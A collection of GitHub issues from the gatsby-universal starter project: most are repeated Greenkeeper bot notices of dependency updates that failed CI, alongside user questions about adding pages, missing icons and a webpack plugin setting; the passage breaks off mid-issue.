gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/459?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.38` to `2.0.39`.
- The `dependency` [gatsby-plugin-react-helmet](https://www.npmjs.com/package/gatsby-plugin-react-helmet) was updated from `3.0.11` to `3.0.12`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.34` to `2.0.35`.
- The `dependency` [gatsby-plugin-sitemap](https://www.npmjs.com/package/gatsby-plugin-sitemap) was updated from `2.0.11` to `2.0.12`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.29` to `2.0.30`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.8` to `2.3.9`.
- The `dependency` [gatsby-transformer-sharp](https://www.npmjs.com/package/gatsby-transformer-sharp) was updated from `2.1.17` to `2.1.18`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.3.25` to `2.3.26`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190423124055).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/776?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.38` to `2.0.39`.
- The `dependency` [gatsby-plugin-react-helmet](https://www.npmjs.com/package/gatsby-plugin-react-helmet) was updated from `3.0.11` to `3.0.12`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.34` to `2.0.35`.
- The `dependency` [gatsby-plugin-sitemap](https://www.npmjs.com/package/gatsby-plugin-sitemap) was updated from `2.0.11` to `2.0.12`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.29` to `2.0.30`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.8` to `2.3.9`.
- The `dependency` [gatsby-transformer-sharp](https://www.npmjs.com/package/gatsby-transformer-sharp) was updated from `2.1.17` to `2.1.18`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.3.25` to `2.3.26`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190423124108).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/777?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 The interaction observer component stops working if it exists in two different pages and you navigate directly from one to the other.

i created a test in codesandbox that adds the IO-Example component to the about page, there you can see that if you refresh any of the pages it works but if you navigate from one to the other the interaction is not registered.

https://codesandbox.io/s/gatsby-universal-smyvs


 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.32` to `2.0.33`.
- The `dependency` [gatsby-plugin-offline](https://www.npmjs.com/package/gatsby-plugin-offline) was updated from `2.0.24` to `2.0.25`.
- The `dependency` [gatsby-plugin-react-helmet](https://www.npmjs.com/package/gatsby-plugin-react-helmet) was updated from `3.0.8` to `3.0.9`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.27` to `2.0.28`.
- The `dependency` [gatsby-plugin-sitemap](https://www.npmjs.com/package/gatsby-plugin-sitemap) was updated from `2.0.8` to `2.0.9`.
- The `dependency` [gatsby-plugin-styled-components](https://www.npmjs.com/package/gatsby-plugin-styled-components) was updated from `3.0.6` to `3.0.7`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.24` to `2.0.25`.
- The `dependency` [gatsby-transformer-json](https://www.npmjs.com/package/gatsby-transformer-json) was updated from `2.1.9` to `2.1.10`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.2` to `2.3.3`.
- The `dependency` [gatsby-transformer-sharp](https://www.npmjs.com/package/gatsby-transformer-sharp) was updated from `2.1.16` to `2.1.17`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.1.31` to `2.1.32`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190313225541).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/367?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.30` to `2.0.31`.
- The `dependency` [gatsby-plugin-react-helmet](https://www.npmjs.com/package/gatsby-plugin-react-helmet) was updated from `3.0.7` to `3.0.8`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.24` to `2.0.25`.
- The `dependency` [gatsby-plugin-sitemap](https://www.npmjs.com/package/gatsby-plugin-sitemap) was updated from `2.0.5` to `2.0.6`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.22` to `2.0.23`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.0` to `2.3.1`.
- The `dependency` [gatsby-transformer-sharp](https://www.npmjs.com/package/gatsby-transformer-sharp) was updated from `2.1.14` to `2.1.15`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.1.27` to `2.1.28`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190311092129).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/271?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 19 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/9381fd0348514289984ef060e6ed907a4c86bffe"><code>9381fd0</code></a> <code>chore(release): Publish</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/617df2488df6afacba386da557fd80dfa9d28df6"><code>617df24</code></a> <code>fix(gatsby-plugin-netlify-cms): Add listener for /admin (#12474)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/fceb4e7ef49e29be07ac6f39ef456f40458ba970"><code>fceb4e7</code></a> <code>fix(gatsby): correct bootstrap emit order (#12473)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/331638a1601e7b2b112149e9b9e2c43c2de43de0"><code>331638a</code></a> <code>fix(gatsby) improve missing page component error message (#12472)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/0f136d524fe6cfdd00fcb6ca218b8e61ca57737e"><code>0f136d5</code></a> <code>fix(gatsby): Emit BOOTSTRAP_FINISHED when bootstrap finishes (#12461)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/7ba331c37c195cc6696dc3382a7e046a77078883"><code>7ba331c</code></a> <code>Typo (#12459)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/6866e76c4f0b02221e6eac93a0582939cae49103"><code>6866e76</code></a> <code>feat(gatsby-remark-images-contentful): enable webp sources (#11273)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/229bf43edc26e6bec766781d5bd8a4963a31c6c2"><code>229bf43</code></a> <code>docs(www): Add quotes to Gryffindor string literal (#12450)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/d47b0e2078428ca7e90e6ada8411e8a85b9ab89c"><code>d47b0e2</code></a> <code>Make headline bigger</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/a381c629d9e905f6da161fe64309eb3b25da32ad"><code>a381c62</code></a> <code>Update README.md with changes made to gatsbyjs.org</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/0173f6b514ac62949a205b334d5723e40b5e9032"><code>0173f6b</code></a> <code>document reserved words in React context (#12424)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/91819a8c12c840c0ec7de84cd3aa4e54c20d94ef"><code>91819a8</code></a> <code>chore(blog): add blogpost about gatsbyjs.org redesign (#12337)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/a14176328a56b0bdb777a9d2546aa1fd4e793858"><code>a141763</code></a> <code>chore(www): Remove non-Gatsby site from the showcase (#12425)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/b645b251c48908c878ac4b81167f5d3fac662823"><code>b645b25</code></a> <code>docs: add new doc on why Gatsby uses GraphQL (#11787)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/6e57064b167c4d752a49d45b8ff36d82776fbcfc"><code>6e57064</code></a> <code>chore(starters): add gatsby-starter-infinite-scroll (#12349)</code></li>
</ul>
<p>There are 19 commits in total.</p>
<p>See the <a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/compare/95f1fce1c60375090c2c787b126d385e91850566...9381fd0348514289984ef060e6ed907a4c86bffe">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 I've been struggling with [an issue](https://github.com/jeremyckahn/shifty/issues/112) with the [shifty](https://github.com/jeremyckahn/shifty/) library, which with the help of shifty's owner I've hunted down to the default config of `directory-named-webpack-plugin` affecting modules within `node_modules`, which I think it's safe to assume should handle their own resolution regarding what files to consider their primary entry points.

Adding `exclude: /node_modules/` to the config fixes the issue I was having with `shifty`, and seems to me to be a pretty sensible default, so I've made a pull request with the change. 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.30` to `2.0.31`.
- The `dependency` [gatsby-plugin-react-helmet](https://www.npmjs.com/package/gatsby-plugin-react-helmet) was updated from `3.0.7` to `3.0.8`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.24` to `2.0.25`.
- The `dependency` [gatsby-plugin-sitemap](https://www.npmjs.com/package/gatsby-plugin-sitemap) was updated from `2.0.5` to `2.0.6`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.22` to `2.0.23`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.0` to `2.3.1`.
- The `dependency` [gatsby-transformer-sharp](https://www.npmjs.com/package/gatsby-transformer-sharp) was updated from `2.1.14` to `2.1.15`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.1.27` to `2.1.28`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190311090723).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/270?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.33` to `2.0.34`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.28` to `2.0.29`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.26` to `2.0.27`.
- The `dependency` [gatsby-transformer-json](https://www.npmjs.com/package/gatsby-transformer-json) was updated from `2.1.10` to `2.1.11`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.3` to `2.3.4`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.1.33` to `2.1.34`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190315183213).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/395?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.38` to `2.0.39`.
- The `dependency` [gatsby-plugin-react-helmet](https://www.npmjs.com/package/gatsby-plugin-react-helmet) was updated from `3.0.11` to `3.0.12`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.34` to `2.0.35`.
- The `dependency` [gatsby-plugin-sitemap](https://www.npmjs.com/package/gatsby-plugin-sitemap) was updated from `2.0.11` to `2.0.12`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.29` to `2.0.30`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.8` to `2.3.9`.
- The `dependency` [gatsby-transformer-sharp](https://www.npmjs.com/package/gatsby-transformer-sharp) was updated from `2.1.17` to `2.1.18`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.3.25` to `2.3.26`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190423123945).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/775?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.38` to `2.0.39`.
- The `dependency` [gatsby-plugin-react-helmet](https://www.npmjs.com/package/gatsby-plugin-react-helmet) was updated from `3.0.11` to `3.0.12`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.34` to `2.0.35`.
- The `dependency` [gatsby-plugin-sitemap](https://www.npmjs.com/package/gatsby-plugin-sitemap) was updated from `2.0.11` to `2.0.12`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.29` to `2.0.30`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.8` to `2.3.9`.
- The `dependency` [gatsby-transformer-sharp](https://www.npmjs.com/package/gatsby-transformer-sharp) was updated from `2.1.17` to `2.1.18`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.3.25` to `2.3.26`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190423123942).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/774?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.32` to `2.0.33`.
- The `dependency` [gatsby-plugin-offline](https://www.npmjs.com/package/gatsby-plugin-offline) was updated from `2.0.24` to `2.0.25`.
- The `dependency` [gatsby-plugin-react-helmet](https://www.npmjs.com/package/gatsby-plugin-react-helmet) was updated from `3.0.8` to `3.0.9`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.27` to `2.0.28`.
- The `dependency` [gatsby-plugin-sitemap](https://www.npmjs.com/package/gatsby-plugin-sitemap) was updated from `2.0.8` to `2.0.9`.
- The `dependency` [gatsby-plugin-styled-components](https://www.npmjs.com/package/gatsby-plugin-styled-components) was updated from `3.0.6` to `3.0.7`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.24` to `2.0.25`.
- The `dependency` [gatsby-transformer-json](https://www.npmjs.com/package/gatsby-transformer-json) was updated from `2.1.9` to `2.1.10`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.2` to `2.3.3`.
- The `dependency` [gatsby-transformer-sharp](https://www.npmjs.com/package/gatsby-transformer-sharp) was updated from `2.1.16` to `2.1.17`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.1.31` to `2.1.32`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190313225541).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/367?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 thx a lot for putting together a nice template, planning to use it for a simple web app that i'm doing as side project. although i use react on a daily basis, i've used graphql on toy projects only and i'm a newbie on gatsby. So please forgive me if what i'm asking looks like a dumb question :)

just tried to create a new page called test, created test.js in pages folder:

```
import React from 'react';
import PropTypes from 'prop-types';
import { graphql } from 'gatsby';
import Layout from 'components/layout';
import Box from 'components/box';
import Head from 'components/head';

const Test = ({ data }) => (
  <Layout>
    <Head pageTitle={data.testJson.title} />
    <Box>
      <div
        dangerouslySetInnerHTML={{
          __html: data.testJson.content.childMarkdownRemark.html,
        }}
      />
    </Box>
  </Layout>
);

Test.propTypes = {
  data: PropTypes.object.isRequired,
};

export default Test;

export const query = graphql`
  query TestQuery {
    testJson {
      title
      content {
        childMarkdownRemark {
          html
        }
      }
    }
  }
`;
```

Just copy of about page, renamed all about things to test.

created test folder with test.json and content.md under /content folder, just copy of about (markdown file is just a line of text though).

I got the following error when I save the project:
```
Unknown field 'testJson' on type 'Query'. Source: document `TestQuery` file: `GraphQL request`
```

Obviously it's related with this part it looks:
```
export const query = graphql`
  query TestQuery {
    testJson {
      title
      content {
        childMarkdownRemark {
          html
        }
      }
    }
  }
`;
```

As I remember from the gatsby tutorial in gatsby's website, the queries are created using gatsby-node.js file, but it looks it's just a boilerplate in this template. Just trying to understand where aboutJson query is defined, so I can define testJson accordingly but no joy so far. Can you please explain, how can I add a new page using this template?

Cheers, With a new project,

```
 gatsby new my-site https://github.com/fabe/gatsby-universal
```

I do `gatsby build` and `gatsby serve` 

the html that is generated references eg `icons/apple-touch-icon-57x57.png` etc... but those files don't seem to exist. I can't find a subfolder `icons` in `public` at all.  What am I doing wrong? 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.28` to `2.0.29`.
- The `dependency` [gatsby-plugin-offline](https://www.npmjs.com/package/gatsby-plugin-offline) was updated from `2.0.22` to `2.0.23`.
- The `dependency` [gatsby-plugin-react-helmet](https://www.npmjs.com/package/gatsby-plugin-react-helmet) was updated from `3.0.5` to `3.0.6`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.19` to `2.0.20`.
- The `dependency` [gatsby-plugin-sitemap](https://www.npmjs.com/package/gatsby-plugin-sitemap) was updated from `2.0.4` to `2.0.5`.
- The `dependency` [gatsby-plugin-styled-components](https://www.npmjs.com/package/gatsby-plugin-styled-components) was updated from `3.0.4` to `3.0.5`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.19` to `2.0.20`.
- The `dependency` [gatsby-transformer-json](https://www.npmjs.com/package/gatsby-transformer-json) was updated from `2.1.7` to `2.1.8`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.2.4` to `2.2.5`.
- The `dependency` [gatsby-transformer-sharp](https://www.npmjs.com/package/gatsby-transformer-sharp) was updated from `2.1.12` to `2.1.13`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.1.0` to `2.1.1`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190214124336).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/125?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 8 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/ba46e9967317398bc97000d1300d369369798b8f"><code>ba46e99</code></a> <code>chore(release): Publish</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/8494a1bd989892a28f11d272751a604bd8de09d5"><code>8494a1b</code></a> <code>Move to @gatsbyjs scoped version of yarn (#11759)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/67c0131a0dbaac4d9b535197f70bcbde0f37f49c"><code>67c0131</code></a> <code>fix(blog): 2019-01-01 json code blocks (#11750)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/d1ae7abfa566d89cd65f41d10bc8f7438367ab82"><code>d1ae7ab</code></a> <code>fix(starters): update dependency gatsby to ^2.1.0 (#11745)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/03fae4873d6eef0a0cd8b6c3fbc20af716d4b020"><code>03fae48</code></a> <code>fix(starters): update dependency prop-types to ^15.7.2 (#11748)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/5e7899c7882f08ce25bfbe24c17ce3d4c39f6589"><code>5e7899c</code></a> <code>feat(showcase): add Incremental.com.au (#11729)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/8f7f8cdfe106f9732944662bf5ad5839632a68de"><code>8f7f8cd</code></a> <code>feat(starters): add starter magicsoup.io (#11670)</code></li>
<li><a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/commit/bb147bd3aa1de272d75c270b61981627edacb88d"><code>bb147bd</code></a> <code>docs(gatsby): Add documentation for useStaticQuery (#11741)</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/gatsbyjs/gatsby/compare/9896fa0e3d4cfb6dc285c3734f1472347f4f2e56...ba46e9967317398bc97000d1300d369369798b8f">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 thx a lot for putting together a nice template, planning to use it for a simple web app that i'm doing as side project. although i use react on a daily basis, i've used graphql on toy projects only and i'm a newbie on gatsby. So please forgive me if what i'm asking looks like a dumb question :)

just tried to create a new page called test, created test.js in pages folder:

```
import React from 'react';
import PropTypes from 'prop-types';
import { graphql } from 'gatsby';
import Layout from 'components/layout';
import Box from 'components/box';
import Head from 'components/head';

